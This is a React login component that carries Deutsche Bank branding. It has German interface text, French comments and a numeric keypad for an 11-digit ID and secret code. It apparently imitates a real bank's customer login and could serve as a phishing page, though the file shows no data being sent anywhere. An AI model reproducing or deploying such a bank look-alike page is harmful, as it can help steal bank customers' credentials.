// components/LoginPage.jsx

import React, { useState } from 'react';
import { Delete } from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import { useNavigate } from 'react-router-dom';

export default function LoginPage() {
  const navigate = useNavigate();
  const { login, loading, error } = useAuth();
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [formError, setFormError] = useState('');
  const [showKeyboard, setShowKeyboard] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    // Limiter à 11 chiffres pour l'identifiant
    if (name === 'username') {
      const onlyNumbers = value.replace(/\D/g, '');
      if (onlyNumbers.length <= 11) {
        setFormData(prev => ({ ...prev, [name]: onlyNumbers }));
      }
    } 
    // Accepter uniquement des chiffres pour le mot de passe
    else if (name === 'password') {
      const onlyNumbers = value.replace(/\D/g, '');
      setFormData(prev => ({ ...prev, [name]: onlyNumbers }));
    } 
    else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
    
    setFormError('');
  };

  const handleNumberClick = (num) => {
    setFormData(prev => ({ ...prev, password: prev.password + num }));
  };

  const handleDelete = () => {
    setFormData(prev => ({ ...prev, password: prev.password.slice(0, -1) }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setFormError('');

    // Validations côté client
    if (!formData.username || !formData.password) {
      setFormError('Bitte füllen Sie alle Felder aus');
      return;
    }

    if (formData.username.length !== 11) {
      setFormError('Die Kennung muss genau 11 Ziffern enthalten');
      return;
    }

    if (formData.password.length < 6) {
      setFormError('Das Passwort muss mindestens 6 Ziffern enthalten');
      return;
    }

    try {
      await login(formData.username, formData.password);
      navigate('/dashboard');
    } catch (err) {
      setFormError(err.message || 'Fehler bei der Anmeldung');
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg max-w-md w-full p-8 shadow-lg">
        <button 
          onClick={() => navigate('/')}
          className="text-gray-400 hover:text-gray-600 text-sm mb-4 flex items-center gap-2"
        >
          ← Zurück zur Startseite
        </button>
        
        <div className="text-center mb-6">
          <div className="w-20 h-20 flex items-center justify-center mx-auto mb-4">
            <img 
              src="/images/p7.jpeg" 
              alt="Deutsche Bank" 
              className="w-full h-full object-contain"
            />
          </div>
          <h2 className="text-2xl font-bold text-blue-900">Anmeldung</h2>
          <p className="text-gray-600 mt-2">Zugang zu Ihrem Kundenbereich</p>
        </div>

        {(formError || error) && (
          <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
            <p className="text-sm text-red-600">{formError || error}</p>
          </div>
        )}

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Kennung
            </label>
            <input 
              type="text"
              name="username"
              value={formData.username}
              onChange={handleChange}
              disabled={loading}
              inputMode="numeric"
              pattern="\d*"
              maxLength="11"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-900 focus:border-transparent disabled:bg-gray-100"
              placeholder="01234567899"
            />
            <p className="text-xs text-gray-500 mt-1">
              {formData.username.length}/11 Ziffern
            </p>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Geheimcode
            </label>
            <input 
              type="password"
              name="password"
              value={formData.password}
              onFocus={() => setShowKeyboard(true)}
              disabled={loading}
              readOnly
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-900 focus:border-transparent disabled:bg-gray-100 cursor-pointer"
              placeholder="••••••"
            />
          </div>

          {/* Clavier Numérique */}
          {showKeyboard && (
            <div className="bg-gray-50 rounded-lg p-4 grid grid-cols-3 gap-3">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                <button
                  key={num}
                  type="button"
                  onClick={() => handleNumberClick(num.toString())}
                  disabled={loading}
                  className="bg-white hover:bg-gray-100 active:bg-gray-200 text-gray-900 text-2xl font-semibold py-4 rounded-lg transition-all disabled:opacity-50 shadow-sm"
                >
                  {num}
                </button>
              ))}
              <div className="col-span-1"></div>
              <button
                type="button"
                onClick={() => handleNumberClick('0')}
                disabled={loading}
                className="bg-white hover:bg-gray-100 active:bg-gray-200 text-gray-900 text-2xl font-semibold py-4 rounded-lg transition-all disabled:opacity-50 shadow-sm"
              >
                0
              </button>
              <button
                type="button"
                onClick={handleDelete}
                disabled={loading}
                className="bg-white hover:bg-gray-100 active:bg-gray-200 text-gray-900 text-2xl font-bold py-4 rounded-lg transition-all flex items-center justify-center disabled:opacity-50 shadow-sm"
              >
                <Delete className="w-6 h-6" strokeWidth={2.5} />
              </button>
            </div>
          )}

          <button 
            onClick={handleSubmit}
            disabled={loading}
            className="w-full bg-blue-900 hover:bg-blue-950 text-white py-3 rounded-lg font-medium transition disabled:bg-blue-400 flex items-center justify-center"
          >
            {loading ? (
              <>
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Anmeldung läuft...
              </>
            ) : (
              'Anmelden'
            )}
          </button>

          <div className="text-center">
            <button 
              type="button"
              onClick={() => alert('Funktion kommt bald')}
              className="text-sm text-blue-900 hover:underline"
            >
              Passwort vergessen?
            </button>
          </div>

          <div className="border-t pt-4 mt-4">
            <p className="text-sm text-gray-600 text-center mb-3">
              Sie haben noch kein Konto?
            </p>
            <button 
              type="button"
              onClick={() => navigate('/inscription')}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition"
            >
              Kunde werden
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}